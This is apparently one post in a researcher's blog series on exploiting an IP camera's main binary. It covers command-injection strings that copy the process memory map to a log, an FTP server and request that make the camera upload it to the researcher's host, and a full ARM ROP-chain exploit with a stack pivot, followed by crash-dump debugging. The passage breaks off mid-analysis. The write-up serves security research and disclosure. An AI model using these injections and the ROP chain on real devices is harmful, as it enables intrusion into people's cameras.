---
published: true
title: "🎥 [6] Vindication + Full Memory Corruption Exploit on Second Camera"
toc: true
toc_sticky: true
tagline: "After our failed attempt to port the exploit in the last blog, I took a breather and jumped back into this project to finish what I started on the second camera."
windowGradientStart: rgb(4,4,163)
windowGradientEnd: rgb(16,134,251)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgba(244,243,64,255)
maximizeButton: rgb(203,40,86)
closeButton: rgb(222,199,239)
tags:
  - Binary Exploitation
---

After discovering in the last blog that porting over an exploit was not going to be as trivial as I had hoped, I came up with an alternative approach that should also yield code execution.

We will continue trying to exploit a bug that was mitigated by stack canaries on the other camera, so [look back at the last blog](https://luke-m.xyz/video_call_camera/p6.md) for a refresher.

# Getting the Memory Map

As this binary now uses NX, and we are using a string-based bug (therefore no null terminators), we'll need to find gadgets in the imported shared objects in memory (as these are ASLR'd so their addresses probably won't contain zeros).

## Primitives

- **Command Injection**: I decided using the command injection to exfil the **maps** file for the process would be easiest, we can run mutiple commands, so we should be able to move files around.
- **FTP Log Read**: One of the handlers with two stack overflows in (*0x7d8*) actually allows me to export the **/mnt/mtd/Log/Log** file to a self-hosted FTP server which will be handy for exporting the **maps** file.

## **maps** Exfil

This ended up being quite simple to pull off with the following steps.

First, use the command injection to run the following commands (the full **ServerAddr** is presented below to demonstrate the injection):

```
192.168.1.100 & ps aux | grep Sofia > /tmp/p1 &
192.168.1.100 & cat /tmp/p1 | grep -v grep > /tmp/p2 &
192.168.1.100 & cat /tmp/p2 | cut -c3-5 > /tmp/pid &
192.168.1.100 & cat /proc/`cat /tmp/pid`/maps > /tmp/map &
192.168.1.100 & cp /tmp/map /mnt/mtd/Log/Log &
```

This process finds the *pid* of the **Sofia** binary, and copies the **maps** file into the **/mnt/mtd/Log/Log** file so it can be exported.

I came up against the following challenges during this process:
- The size of the injection is limited, hence the commands are split up and small names are used.
- *$* is a bad character as well as a few others, which was particularly annoying for the fourth injection (but luckily \` was fine to use).

I then got the FTP server hosted and working, which allowed the camera to connect and upload to the **Test** directory within the main FTP directory, here is the thread implementation so it can be used without needing to run another script:

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import threading
import time

class FTPServerThread(threading.Thread):
    def __init__(self, host="0.0.0.0", port=9898):
        super().__init__()
        self.host = host
        self.port = port
        self.server = None
        self._stop_event = threading.Event()
        
    def run(self):
        authorizer = DummyAuthorizer()
        authorizer.add_user("uname", "pword", "FTPTestDir", perm="elradfmw")
        handler = FTPHandler
        handler.authorizer = authorizer
        self.server = FTPServer((self.host, self.port), handler)
        
        while not self._stop_event.is_set():
            self.server.serve_forever(timeout=0.2, blocking=True)
            
    def stop(self):
        self._stop_event.set()
        if self.server:
            self.server.close_all()
```

If you are going to use this code, make sure there is a **Test** directory within **FTPTestDir** otherwise the upload will not work. Also, make sure you send the FTP request in the same session as the command injection requests, as the login will cause the copied **maps** file to be overwritten with the actual log again.

You can trigger the upload with the following request:

```
00000000  ff 01 00 00  9f 86 01 00  9f 86 01 00  00 00 d8 07  │····│····│····│····│
00000010  90 00 00 00  7b 22 4e 61  6d 65 22 3a  20 22 46 54  │····│{"Na│me":│ "FT│
00000020  50 22 2c 20  22 46 54 50  22 3a 20 7b  22 53 65 72  │P", │"FTP│": {│"Ser│
00000030  76 65 72 22  3a 20 7b 22  4e 61 6d 65  22 3a 20 22  │ver"│: {"│Name│": "│
00000040  31 39 32 2e  31 36 38 2e  31 38 38 2e  34 22 2c 20  │192.│168.│188.│4", │
00000050  22 50 6f 72  74 22 3a 20  39 38 39 38  2c 20 22 55  │"Por│t": │9898│, "U│
00000060  73 65 72 4e  61 6d 65 22  3a 20 22 75  6e 61 6d 65  │serN│ame"│: "u│name│
00000070  22 2c 20 22  50 61 73 73  77 6f 72 64  22 3a 20 22  │", "│Pass│word│": "│
00000080  70 77 6f 72  64 22 7d 7d  2c 20 22 53  65 73 73 69  │pwor│d"}}│, "S│essi│
00000090  6f 6e 49 44  22 3a 20 22  30 78 30 30  30 30 30 30  │onID│": "│0x00│0000│
000000a0  30 34 22 7d                                         │04"}│
000000a4
```

And now we have the **maps** file for the process, giving us the addresses of all of the shared objects, allowing us to find gadgets.

```
=== MEMORY MAP ===
00008000-0068b000 r-xp 00000000 1f:03 54         /usr/bin/Sofia
00693000-006cb000 rw-p 00683000 1f:03 54         /usr/bin/Sofia
006cb000-0095b000 rw-p 00000000 00:00 0 
010c8000-01382000 rw-p 00000000 00:00 0          [heap]
aff02000-aff37000 rw-s 82d3e000 00:0a 131        /dev/mmz
aff37000-aff38000 ---p 00000000 00:00 0 
aff38000-b0037000 rw-p 00000000 00:00 0          [stack:800]
b0037000-b0038000 ---p 00000000 00:00 0 
b0038000-b0137000 rw-p 00000000 00:00 0          [stack:799]
b0137000-b0138000 ---p 00000000 00:00 0 
b0138000-b0237000 rw-p 00000000 00:00 0          [stack:795]
b0237000-b0238000 ---p 00000000 00:00 0 
b0238000-b0337000 rw-p 00000000 00:00 0          [stack:781]
b0337000-b0338000 ---p 00000000 00:00 0 
b0338000-b0437000 rw-p 00000000 00:00 0          [stack:780]
b0437000-b0438000 ---p 00000000 00:00 0 
b0438000-b0537000 rw-p 00000000 00:00 0          [stack:764]
b0537000-b0538000 ---p 00000000 00:00 0 
b0538000-b0737000 rw-p 00000000 00:00 0          [stack:743]
b0737000-b07a0000 rw-s 83a52000 00:0a 131        /dev/mmz
b07d5000-b07d6000 ---p 00000000 00:00 0 
b07d6000-b08d5000 rw-p 00000000 00:00 0          [stack:742]
b08d5000-b08d6000 ---p 00000000 00:00 0 
b08d6000-b09d5000 rw-p 00000000 00:00 0          [stack:741]
b09d5000-b09d6000 rw-s 83a51000 00:0a 131        /dev/mmz
b09d6000-b09d7000 rw-s 83a50000 00:0a 131        /dev/mmz
b09d7000-b09da000 rw-s 83a4d000 00:0a 131        /dev/mmz
b09da000-b09db000 rw-s 83a4c000 00:0a 131        /dev/mmz
b09db000-b09dc000 rw-s 83a4b000 00:0a 131        /dev/mmz
b09dc000-b0b26000 rw-s 83900000 00:0a 131        /dev/mmz
b0b26000-b0b27000 ---p 00000000 00:00 0 
b0b27000-b0c26000 rw-p 00000000 00:00 0          [stack:725]
b0c26000-b0c27000 ---p 00000000 00:00 0 
b0c27000-b0d26000 rw-p 00000000 00:00 0          [stack:724]
b0d26000-b0d27000 ---p 00000000 00:00 0 
b0d27000-b0e26000 rw-p 00000000 00:00 0          [stack:723]
b0e26000-b0e27000 ---p 00000000 00:00 0 
b0e27000-b0f26000 rw-p 00000000 00:00 0          [stack:722]
b0f26000-b0f96000 rw-s 83890000 00:0a 131        /dev/mmz
b0f96000-b0f9e000 rw-s 83888000 00:0a 131        /dev/mmz
b0f9e000-b0fa1000 rw-s 83885000 00:0a 131        /dev/mmz
b0fa1000-b0fa2000 ---p 00000000 00:00 0 
b0fa2000-b11a1000 rw-p 00000000 00:00 0          [stack:721]
b11a1000-b11a2000 ---p 00000000 00:00 0 
b11a2000-b153b000 rw-p 00000000 00:00 0          [stack:720]
b153b000-b153c000 ---p 00000000 00:00 0 
b153c000-b1a55000 rw-p 00000000 00:00 0          [stack:718]
b1a55000-b1a56000 rw-s 83884000 00:0a 131        /dev/mmz
b1a56000-b1a57000 ---p 00000000 00:00 0 
b1a57000-b1c56000 rw-p 00000000 00:00 0          [stack:717]
b1c56000-b1c81000 rw-s 83859000 00:0a 131        /dev/mmz
b1c81000-b1c82000 ---p 00000000 00:00 0 
b1c82000-b1e81000 rw-p 00000000 00:00 0          [stack:716]
b1e81000-b1e82000 ---p 00000000 00:00 0 
b1e82000-b2081000 rw-p 00000000 00:00 0          [stack:715]
b2081000-b2082000 ---p 00000000 00:00 0 
b2082000-b2181000 rw-p 00000000 00:00 0          [stack:714]
b2181000-b2182000 ---p 00000000 00:00 0 
b2182000-b2281000 rw-p 00000000 00:00 0          [stack:713]
b2281000-b2282000 ---p 00000000 00:00 0 
b2282000-b2481000 rw-p 00000000 00:00 0          [stack:712]
b2481000-b2482000 ---p 00000000 00:00 0 
b2482000-b2681000 rw-p 00000000 00:00 0          [stack:711]
b2681000-b2682000 ---p 00000000 00:00 0 
b2682000-b2781000 rw-p 00000000 00:00 0          [stack:710]
b2781000-b2782000 ---p 00000000 00:00 0 
b2782000-b2881000 rw-p 00000000 00:00 0          [stack:709]
b2881000-b2882000 ---p 00000000 00:00 0 
b2882000-b2981000 rw-p 00000000 00:00 0          [stack:708]
b2981000-b2982000 ---p 00000000 00:00 0 
b2982000-b2a81000 rw-p 00000000 00:00 0          [stack:707]
b2a81000-b2a82000 ---p 00000000 00:00 0 
b2a82000-b2b81000 rw-p 00000000 00:00 0          [stack:706]
b2b81000-b2b82000 ---p 00000000 00:00 0 
b2b82000-b2c81000 rw-p 00000000 00:00 0          [stack:705]
b2c81000-b2c82000 ---p 00000000 00:00 0 
b2c82000-b2ca3000 rw-p 00000000 00:00 0          [stack:704]
b2ca3000-b2ca4000 ---p 00000000 00:00 0 
b2ca4000-b2da3000 rw-p 00000000 00:00 0          [stack:703]
b2da3000-b2da4000 ---p 00000000 00:00 0 
b2da4000-b2ea3000 rw-p 00000000 00:00 0          [stack:702]
b2ea3000-b2ea4000 rw-s 83858000 00:0a 131        /dev/mmz
b2ea4000-b2ea5000 ---p 00000000 00:00 0 
b2ea5000-b2fa4000 rw-p 00000000 00:00 0          [stack:701]
b2fa4000-b2fa5000 ---p 00000000 00:00 0 
b2fa5000-b30a4000 rw-p 00000000 00:00 0          [stack:700]
b30a4000-b30a5000 ---p 00000000 00:00 0 
b30a5000-b31a4000 rw-p 00000000 00:00 0          [stack:699]
b31a4000-b31ef000 rw-s 8380b000 00:0a 131        /dev/mmz
b31ef000-b31f0000 ---p 00000000 00:00 0 
b31f0000-b32ef000 rw-p 00000000 00:00 0          [stack:691]
b32ef000-b32f0000 ---p 00000000 00:00 0 
b32f0000-b33ef000 rw-p 00000000 00:00 0          [stack:690]
b33ef000-b33f0000 ---p 00000000 00:00 0 
b33f0000-b34ef000 rw-p 00000000 00:00 0          [stack:689]
b34ef000-b34f0000 ---p 00000000 00:00 0 
b34f0000-b35ef000 rw-p 00000000 00:00 0          [stack:688]
b35ef000-b35f0000 ---p 00000000 00:00 0 
b35f0000-b36ef000 rw-p 00000000 00:00 0          [stack:687]
b36ef000-b36f0000 ---p 00000000 00:00 0 
b36f0000-b37ef000 rw-p 00000000 00:00 0          [stack:686]
b37ef000-b37f0000 ---p 00000000 00:00 0 
b37f0000-b39ef000 rw-p 00000000 00:00 0          [stack:685]
b39ef000-b39f0000 ---p 00000000 00:00 0 
b39f0000-b3aef000 rw-p 00000000 00:00 0          [stack:684]
b3aef000-b3af0000 ---p 00000000 00:00 0 
b3af0000-b3cef000 rw-p 00000000 00:00 0          [stack:683]
b3cef000-b3cf0000 ---p 00000000 00:00 0 
b3cf0000-b3eef000 rw-p 00000000 00:00 0 
b3eef000-b3f1b000 rw-s 837d8000 00:0a 131        /dev/mmz
b3f1b000-b3f1c000 ---p 00000000 00:00 0 
b3f1c000-b411b000 rw-p 00000000 00:00 0          [stack:681]
b411b000-b4167000 rw-s 8378c000 00:0a 131        /dev/mmz
b4167000-b419d000 rw-s 83756000 00:0a 131        /dev/mmz
b419d000-b4208000 rw-s 836eb000 00:0a 131        /dev/mmz
b4208000-b42d1000 rw-s 83622000 00:0a 131        /dev/mmz
b42d1000-b445d000 rw-s 83495000 00:0a 131        /dev/mmz
b445d000-b4775000 rw-s 8317c000 00:0a 131        /dev/mmz
b4775000-b4776000 ---p 00000000 00:00 0 
b4776000-b4975000 rw-p 00000000 00:00 0          [stack:680]
b4975000-b4976000 ---p 00000000 00:00 0 
b4976000-b4b75000 rw-p 00000000 00:00 0          [stack:679]
b4b75000-b4b76000 ---p 00000000 00:00 0 
b4b76000-b4d75000 rw-p 00000000 00:00 0          [stack:678]
b4d75000-b4d76000 ---p 00000000 00:00 0 
b4d76000-b4e75000 rw-p 00000000 00:00 0          [stack:677]
b4e75000-b4e76000 ---p 00000000 00:00 0 
b4e76000-b5075000 rw-p 00000000 00:00 0          [stack:663]
b5075000-b5076000 ---p 00000000 00:00 0 
b5076000-b5175000 rw-p 00000000 00:00 0          [stack:662]
b5175000-b5176000 ---p 00000000 00:00 0 
b5176000-b5375000 rw-p 00000000 00:00 0 
b5375000-b5376000 ---p 00000000 00:00 0 
b5376000-b5575000 rw-p 00000000 00:00 0          [stack:660]
b5575000-b5576000 ---p 00000000 00:00 0 
b5576000-b5775000 rw-p 00000000 00:00 0          [stack:659]
b5775000-b5776000 ---p 00000000 00:00 0 
b5776000-b5875000 rw-p 00000000 00:00 0          [stack:658]
b5875000-b5876000 ---p 00000000 00:00 0 
b5876000-b5a75000 rw-p 00000000 00:00 0          [stack:647]
b5a75000-b5a76000 ---p 00000000 00:00 0 
b5a76000-b5b75000 rw-p 00000000 00:00 0          [stack:629]
b5b75000-b5b76000 ---p 00000000 00:00 0 
b5b76000-b5d75000 rw-p 00000000 00:00 0          [stack:623]
b5d75000-b5d76000 ---p 00000000 00:00 0 
b5d76000-b6276000 rw-p 00000000 00:00 0          [stack:622]
b6276000-b6277000 ---p 00000000 00:00 0 
b6277000-b6376000 rw-p 00000000 00:00 0          [stack:621]
b6376000-b6377000 ---p 00000000 00:00 0 
b6377000-b6476000 rw-p 00000000 00:00 0          [stack:620]
b6476000-b6477000 ---p 00000000 00:00 0 
b6477000-b6576000 rw-p 00000000 00:00 0          [stack:619]
b6576000-b6577000 ---p 00000000 00:00 0 
b6577000-b6676000 rw-p 00000000 00:00 0          [stack:611]
b6676000-b6677000 ---p 00000000 00:00 0 
b6677000-b6776000 rw-p 00000000 00:00 0          [stack:607]
b6776000-b6777000 ---p 00000000 00:00 0 
b6777000-b6976000 rw-p 00000000 00:00 0          [stack:604]
b6976000-b6977000 ---p 00000000 00:00 0 
b6977000-b6b76000 rw-p 00000000 00:00 0          [stack:603]
b6b76000-b6b77000 ---p 00000000 00:00 0 
b6b77000-b6d76000 rw-p 00000000 00:00 0          [stack:602]
b6d76000-b6dcd000 r-xp 00000000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dcd000-b6dd4000 ---p 00000000 00:00 0 
b6dd4000-b6dd5000 r--p 00056000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dd5000-b6dd6000 rw-p 00057000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dd6000-b6dda000 rw-p 00000000 00:00 0 
b6dda000-b6df6000 r-xp 00000000 1f:02 533968     /lib/libgcc_s.so.1
b6df6000-b6dfd000 ---p 00000000 00:00 0 
b6dfd000-b6dfe000 rw-p 0001b000 1f:02 533968     /lib/libgcc_s.so.1
b6dfe000-b6e09000 r-xp 00000000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e09000-b6e10000 ---p 00000000 00:00 0 
b6e10000-b6e11000 r--p 0000a000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e11000-b6e12000 rw-p 0000b000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e12000-b6eac000 r-xp 00000000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eac000-b6eb3000 ---p 00000000 00:00 0 
b6eb3000-b6eb7000 r--p 00099000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eb7000-b6eb9000 rw-p 0009d000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eb9000-b6ec0000 rw-p 00000000 00:00 0 
b6ec0000-b6ec6000 r-xp 00000000 1f:03 45         /usr/lib/libjson.so.0
b6ec6000-b6ecd000 ---p 00000000 00:00 0 
b6ecd000-b6ece000 rw-p 00005000 1f:03 45         /usr/lib/libjson.so.0
b6ece000-b6ed1000 r-xp 00000000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6ed1000-b6ed8000 ---p 00000000 00:00 0 
b6ed8000-b6ed9000 r--p 00002000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6ed9000-b6eda000 rw-p 00003000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6eda000-b6f08000 r-xp 00000000 1f:03 42         /usr/lib/libdvr.so
b6f08000-b6f10000 ---p 00000000 00:00 0 
b6f10000-b6f11000 rw-p 0002e000 1f:03 42         /usr/lib/libdvr.so
b6f11000-b6f1d000 rw-p 00000000 00:00 0 
b6f1d000-b6f2a000 r-xp 00000000 1f:03 41         /usr/lib/libXMcrypto.so
b6f2a000-b6f32000 ---p 00000000 00:00 0 
b6f32000-b6f33000 rw-p 0000d000 1f:03 41         /usr/lib/libXMcrypto.so
b6f33000-b6f46000 r-xp 00000000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f46000-b6f4d000 ---p 00000000 00:00 0 
b6f4d000-b6f4e000 r--p 00012000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f4e000-b6f4f000 rw-p 00013000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f4f000-b6f51000 rw-p 00000000 00:00 0 
b6f51000-b6f57000 r-xp 00000000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
b6f57000-b6f58000 rw-s 21100000 00:0a 12         /dev/mem
b6f58000-b6f59000 rw-s 21000000 00:0a 12         /dev/mem
b6f59000-b6f5a000 rw-s 21000000 00:0a 12         /dev/mem
b6f5a000-b6f5b000 rw-s 00000000 00:04 0          /SYSV010b0422 (deleted)
b6f5b000-b6f5d000 rw-p 00000000 00:00 0 
b6f5d000-b6f5e000 r-xp 00000000 00:00 0          [sigpage]
b6f5e000-b6f5f000 r--p 00005000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
b6f5f000-b6f60000 rw-p 00006000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
bea9d000-beabe000 rw-p 00000000 00:00 0          [stack]
ffff0000-ffff1000 r-xp 00000000 00:00 0          [vectors]
```

# ROP-Chain

## Stack Pivot

Cool, so now we have the **maps** file, we can start looking for gadgets! For the sake of this blog, I will just dump the full ROP-chain, and highlight any interesting gadgets I used.

```python
def send_stack_pivot(sock, session_id, seq_number, libc_base_address, libcpp_base_address):
    """
    Sends a system info request message with type 0x3fc
    """

    libc_base_addr_int = int(libc_base_address, 16)
    libcpp_base_addr_int = int(libcpp_base_address, 16)
    xor_key = 0xffffffff
    sofia_gadget_xor = (0x3f43a8 - 0x34) ^ xor_key # subtract because gagdet adds to it later
    http_buffer_ptr_xor = 0x8f1cfc ^ xor_key

    context.arch = 'arm'
    context.bits = 32
    context.endian = 'little'

    rop_chain = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1"

    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libcpp_base_addr_int + 0x8d62c) # r5 - gets put into lr for later gadget
    rop_chain += p32(libcpp_base_addr_int + 0x4b970) # r6 - for later gadget
    rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

    # libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(libc_base_addr_int + 0x63710) # r3 - needs to be valid writeable mem addr
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(xor_key) # r5 - goes into r1 as the XOR key
    rop_chain += p32(libc_base_addr_int + 0x515c0) # pc

    # libc: 000615c0 cpy lr,r1 ; str r1,[r3,#0x0] ; str r2,[r3,#0x4] ; ldmia sp!,{r4,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

    # libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(sofia_gadget_xor) # r3 - XOR of the Sofia gadget address
    rop_chain += p32(0x41414141) # r4 - needs to be a valid memory address
    rop_chain += p32(libc_base_addr_int + 0x22104) # r5 - gadget address for after second decode
    rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

    # libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
    # now we have decoded sofia gadget in r3

    # first populate lr for the return after the eor gadget
    # libcpp: 0009d62c cpy r2,r5 ; blx r6

    # libcpp: 0005b970 cpy lr,r2 ; moveq r0,#0x6 ; movne r0,#0x1 ; ldmia sp!,{r4,r5,pc}
    rop_chain += p32(libc_base_addr_int + 0x63710) # r4 - needs to be a writeable memory address
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libcpp_base_addr_int + 0x5e3b0) # pc

    # move sofia gadget into r2 to keep it safe (libstdc++.so gadget btw (make sure r4 writeable memory address))
    # libcpp: 0006e3b0 add r2,r3,#0x34 ; add r3,r3,#0x20 ; str r2,[r4,#0xc] ; 
    #       str r3,[r4,#0x8] ; add sp,sp,#0x8 ; ldmia sp!,{r4,r5,r6,r7,r8,pc}
    rop_chain += p32(0x42424242) # padding
    rop_chain += p32(0x42424242) # padding
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(xor_key) # r5 - goes into r1 as the xor key
    rop_chain += p32(libc_base_addr_int + 0x17604) # r6 - for a later gadget
    rop_chain += p32(0x41414141) # r7
    rop_chain += p32(0xfffffffc) # r8 - second part of http buffer address (basically a -4 due to overflow)
    rop_chain += p32(libc_base_addr_int + 0x4d564) # pc

    # now put the key back into the correct place (r4), put encoded buffer address into r3, r6 set earlier on (libstdc++.so
    # libc : 0005d564 cpy r1,r5 ; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(http_buffer_ptr_xor) # r3 - to be xor'ed
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

    # libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
    # now we have decoded http buffer address in r3 and decoded sofia gadget address in r2

    # libc: 00032104 ldr r1,[r3,#0x0] ; blx r6
    # now the actual address of the http buffer is in r1, and the sofia gadget is in r2

    # libc: 00027604 cpy r0,r1; ldmia sp!,{r4,r5,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libc_base_addr_int + 0x3cc50) # pc

    # libc: 0004cc50 add r0,r0,#0x20 ; ldmia sp!,{r4,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libc_base_addr_int + 0x16cd8) # pc

    # libc: 00026cd8 ldmia sp!,{r3,pc}
    # get control of r3 back
    rop_chain += p32(libc_base_addr_int + 0x50d08) # r3 - for later gadget
    rop_chain += p32(libc_base_addr_int + 0x3e8d4) # pc

    # libc: 0004e8d4 blx r2

    # sofia: 003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3 <- sofia gadget

    # libc: 00060d08 sub sp,r11,#0x4 ; ldmia sp!,{r11,pc} <- stack pivot completed

    rop_chain += b"."    # need the dot for the overflow

    # Create the payload directly in bytes
    payload = b'{"SessionID":"0x%08x","Name":"' % session_id
    payload += rop_chain
    payload += b'"}'

    msg_type = 0x43a
    packet = build_packet(msg_type, seq_number, payload)
    
    try:
        response = send_msg_and_get_response(sock, msg_type, packet)

        header_info, payload, session_id = parse_response(response)

        return seq_number, payload
    except Exception as e:
        return None
```

So, the first issue I came across was a complete lack of gadgets for getting control of the stack pointer in the shared objects. The only gadget I could find was in Sofia, which got control of **r11**:

```
003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3 
```

It was then quite simple to set the **sp** which a pretty common gadget:

```
libc: 00060d08 sub sp,r11,#0x4 ; ldmia sp!,{r11,pc}
```

However, as I could not include null terminators, and all Sofia gadgets have a null in their addresses, I had to work around this using XOR. I ended up finding a pretty decent XOR gadget in *libc* which was immensely helpful:

```
libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
```

It was a bit of a pain to use due to the **bx lr** at the end, but it worked well for decoding both the HTTP buffer address pointer (which we are pivoting to), and the Sofia gadget for performing the pivot. 

A few painful gadgets later, I successfully pivoted to the HTTP buffer which I could pre-fill with a larger ROP-chain (that can also include zero's!). The string of **F**'s is the contents of the HTTP buffer:

![stack_pivot.png](/assets/images/icsee_cameras/p7/stack_pivot.png)

## Its Not All Sunshine and Rainbows

Now that we can execute a less-constrained ROP-chain, we should start to focus on fixing up!

I spent about three days trying to get this to work to no success, I tried a bunch of stuff:
- Tried fixing up every register I possibly could (everything minus **r1**, **r3** and **r11**)
- Tried different points to regain execution
- Tried three different stack overflows - similar crash for all of them
- Loaded GDB about 4 million times
- Analysed the stack frames to ensure I'm not clobbering anything important

Every time I got the stack pointer correct, it would throw out a crash very similar to this:

```
$r0  : 0xb6e12418  →   cmp r0,  #0
$r1  : 0xb6e12418  →   cmp r0,  #0
$r2  : 0xc39264c0
$r3  : 0xe3500000
$r4  : 0xb2dff854  →  0xb6e12418  →   cmp r0,  #0
$r5  : 0x1       
$r6  : 0x1       
$r7  : 0x02850e28  →  0x0284aec8  →  0x0284ba38  →  0x00000000
$r8  : 0xb2dff86c  →  0x00000000
$r9  : 0x0       
$r10 : 0x73776f64 ("dows"?)
$r11 : 0xb6e123c8  →  <obstack_free+0078> str r1,  [r4,  #4]
$r12 : 0xb6fe4ecc  →  0xc39264c0
$sp  : 0xb2dff840  →  0x000005a8
$lr  : 0x00025298  →   mov r0,  r4
$pc  : 0x0001f658  →   ldr r0,  [r3]
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

The cause of the crash is it trying to dereference the contents of **r3**, which it is somehow getting from **r4** which is pointing to a pointer which points to that data. I traced it down to a function that is locking a mutex, and the mutex is no longer valid which causes a crash. It seems like it occurs when the session is being released, but I have absolutely no clue how this is being impacted by the overflow - very frustrating!

![stupid_computer.gif](/assets/images/icsee_cameras/p7/stupid_computer.gif)

If I overflow only **r4-6** and **pc** to the same point I try to resume execution, there is no crash, but when I try to pivot the stack back - crash. I've even made sure there is enough room on the stack frame and I am not overwriting anything important. 

It was it this point I took a break from the project for a couple of weeks (I started a new job), but I spent this time pondering about what could possibly be going wrong.

The list of possibilities is pretty small:
- Clobbering something on the stack that is very important for something
- One of the registers we did not fix up is the problem (**r1**, **r3** or **r11**)

# Analysing Crash Dumps

Lets take a close look at some crash dumps and see if these give us some clues as to where we are going wrong:

```
$r0  : 0xb6e2f994  →   mov r0,  r7
$r1  : 0xb6e2f994  →   mov r0,  r7
$r2  : 0xda62c198
$r3  : 0xe1a00007
$r4  : 0xb2bf4854  →  0xb6e2f994  →   mov r0,  r7
$r5  : 0x1       
$r6  : 0x1       
$r7  : 0x02393cc0  →  0x0238da40  →  0x0238da50  →  0x00000000
$r8  : 0xb2bf486c  →  0x00000000
$r9  : 0x0       
$r10 : 0xb2bf4b00  →  0x00000001
$r11 : 0xb6e2f944  →   str r1,  [r4,  #52]	@ 0x34
$r12 : 0xb6fd8ecc  →  0xda62c198
$sp  : 0xb2bf4840  →  0x000005a8
$lr  : 0x00025298  →   mov r0,  r4
$pc  : 0x0001f658  →   ldr r0,  [r3]
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

## Clue 1

The first clue I got was when I compared how similar the **r11** and **r0**/**r1** values were, no other register has a similar value to **r11**, which gave me a bit of a hint that modification of **r11** was causing the change in value of **r0**/**r1** and the consequent crash. 

## Clue 2

Here is an example of proper usage of the function at the same point:

```
$r0  : 0x00b88778  →  0x00b8a168  →  0x00b8a178  →  0x00000000
$r1  : 0x00b88778  →  0x00b8a168  →  0x00b8a178  →  0x00000000
$r2  : 0x3       
$r3  : 0x00b8a168  →  0x00b8a178  →  0x00000000
$r4  : 0xb2c3a868  →  0x00b88778  →  0x00b8a168  →  0x00b8a178  →  0x00000000
$r5  : 0x00b88438  →  0x005bc530  →  0x0013d168  →   ldr r3,  [pc,  #700]	@ 0x13d42c
$r6  : 0x00b88438  →  0x005bc530  →  0x0013d168  →   ldr r3,  [pc,  #700]	@ 0x13d42c
$r7  : 0x00b88778  →  0x00b8a168  →  0x00b8a178  →  0x00000000
$r8  : 0xb2c3a86c  →  0x00000000
$r9  : 0x00b88438  →  0x005bc530  →  0x0013d168  →   ldr r3,  [pc,  #700]	@ 0x13d42c
$r10 : 0xbe80d95c  →  0x006ca814  →  0x00000000
$r11 : 0xb2c410a4  →  0xb6d870b8  →  <clone+005c> b 0xb6d4394c <_exit>
$r12 : 0x0       
$sp  : 0xb2c3a850  →  0xb2c3a868  →  0x00b88778  →  0x00b8a168  →  0x00b8a178  →  0x00000000
$lr  : 0x00025298  →   mov r0,  r4
$pc  : 0x0001f658  →   ldr r0,  [r3]
$cpsr: [negative zero carry overflow interrupt fast thumb]
```

Okay, so from the expected usage we can see that **r4** is supposed to be much more nested than we are seeing in our crash. Clearly something we are doing is impacting this **r4** value, I also took a look around the **sp** before we jumped into the function we overflow before it caused the crash using **x/200xw $sp-0x100** (note, the value wrapped in ! at *0xb2bf40b0* is what the current **sp** is pointing at):

```
